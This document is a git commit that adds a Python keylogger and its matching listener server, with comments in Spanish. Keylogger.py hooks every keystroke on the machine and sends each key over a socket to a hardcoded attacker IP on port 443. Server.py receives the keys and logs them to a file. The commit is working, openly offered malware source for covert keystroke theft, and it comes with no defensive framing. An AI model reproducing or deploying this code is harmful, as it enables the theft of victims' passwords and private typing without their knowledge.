57d932b579a8fa9aa089f0056865dab91149c060
BeniBeastt <retroo1414@gmail.com>
2024-02-12 19:44:17 +0100

    Update-Files
    Update Files

---
+++ Keylogger.py
@@ -0,0 +1,24 @@
+#!/usr/bin/env python3
+
+import keyboard
+import socket
+import sys
+import signal
+
+# Colocar tu IP aquí
+host = '192.168.1.64'
+port = 443
+
+try:
+    s = socket.socket()
+    s.connect((host, port))
+except:
+    print("\n\n[+] Tienes que iniciar primero el servidor en escucha\n")
+    sys.exit(1)
+
+def on_key_event(event):
+    if event.event_type == keyboard.KEY_UP:
+        s.send(f"'{event.name}'".encode())
+
+keyboard.hook(on_key_event)
+keyboard.wait()
---
+++ Server.py
@@ -0,0 +1,56 @@
+#!/usr/bin/env python3
+
+import socket
+import signal
+import sys
+
+def ctrl_c(sig, frame):
+    print("\n\n[!] Se ha finalizado el script\n")
+    sys.exit(1)
+
+#ctrl_c
+signal.signal(signal.SIGINT, ctrl_c)
+
+# Colocar tu IP aquí
+host = '192.168.1.64'
+port = 443
+
+s = socket.socket()
+s.bind((host, port))
+s.listen(2)
+
+
+def file_write(keys):
+    key_mapping = {
+        'Key.space': 'space',
+        'Key.enter': 'enter',
+        'Key.tab': 'tab'
+
+    }
+
+    decoded_keys = [key_mapping.get(key, key) for key in keys]
+    decoded_text = ''.join(decoded_keys)
+
+    with open("keylogs.txt", "a") as file:
+        file.write(decoded_text + ' ')
+
+
+print(f"\n[+] Servidor en escucha desplegado en el host {host}")
+conn, address = s.accept()
+
+print("Connected to Client: " + str(address))
+
+while True:
+    data = conn.recv(1024).decode()
+
+
+    if 'Key.' in data:
+        data = data.split('.')[1]
+
+
+    file_write([data])
+
+    if not data:
+        break
+    print(str(data))
+conn.close()
